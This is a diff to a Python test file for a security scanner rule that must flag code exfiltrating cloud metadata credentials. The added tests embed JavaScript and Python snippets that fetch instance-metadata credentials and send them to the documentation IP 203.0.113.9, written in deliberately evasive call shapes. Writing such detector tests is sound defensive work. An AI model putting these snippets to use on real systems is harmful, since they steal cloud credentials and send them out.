@@ -145,6 +145,7 @@ def test_python_params_kwarg_fails():
         "params=dict(a=1, d=creds)",
         'params=urlencode({"a": 1, "d": creds})',
         'params={"note": "a, b ) }", "d": creds}',
+        'params={"note": """a " }, b""", "d": creds}',
         'params={"a": 1}, timeout=2, params2=None, params={"d": creds}',
     ],
 )
@@ -153,6 +154,66 @@ def test_params_kwarg_bounding_does_not_hide_a_tainted_value(args):
         "# file: probe.py\n"
         f'creds = requests.get("{_AWS}AppRole", timeout=2).text\n'
         f'requests.get("http://203.0.113.9/c", {args})\n'
+    )
+    assert _b339(blob).status == FAIL
+
+
+_REPORT = '"http://203.0.113.9/c?d=" + encodeURIComponent(out.join("|"))'
+
+
+@pytest.mark.parametrize(
+    "fetch_line",
+    [
+        "for (const u of NODES) { out.push(await (await fetch(`${u}`)).text()) }",
+        "for (const u of NODES) { out.push(await (await fetch(new Request(u))).text()) }",
+        "for (const u of NODES) { out.push(await (await globalThis?.fetch?.(u)).text()) }",
+    ],
+)
+def test_url_name_fetched_in_any_call_shape_still_fails(fetch_line):
+    # Splitting URL names from responses must not let an unusual fetch spelling hide one.
+    blob = (
+        "# file: index.js\n"
+        f'const NODES = ["{_AWS}", "{_ALI}"]\n'
+        "const out = []\n"
+        f"{fetch_line}\n"
+        f"http.get({_REPORT})\n"
+    )
+    assert _b339(blob).status == FAIL
+
+
+@pytest.mark.parametrize(
+    "fetch_line",
+    [
+        "for u in NODES:\n    out.append(requests.get(url=u, timeout=2).text)",
+        'for u in NODES:\n    out.append(requests.get(f"{u}", timeout=2).text)',
+    ],
+)
+def test_python_url_name_fetched_by_keyword_or_fstring_still_fails(fetch_line):
+    blob = (
+        "# file: probe.py\n"
+        f'NODES = ["{_AWS}", "{_ALI}"]\n'
+        "out = []\n"
+        f"{fetch_line}\n"
+        'requests.get("http://203.0.113.9/c?d=" + "|".join(out))\n'
+    )
+    assert _b339(blob).status == FAIL
+
+
+def test_inline_fetch_inside_the_report_url_still_fails():
+    blob = (
+        "# file: index.js\n"
+        f'const u = "{_AWS}";\n'
+        'http.get("http://203.0.113.9/c?d=" + encodeURIComponent(await (await fetch(u)).text()));\n'
+    )
+    assert _b339(blob).status == FAIL
+
+
+def test_unusual_call_before_the_url_keeps_the_seed_a_response():
+    # `)(` is a call: the seed is a fetch result, never a URL holder.
+    blob = (
+        "# file: index.js\n"
+        f'const creds = await (getter())("{_AWS}AppRole");\n'
+        'await fetch("http://203.0.113.9/c?d=" + encodeURIComponent(creds));\n'
     )
     assert _b339(blob).status == FAIL
 
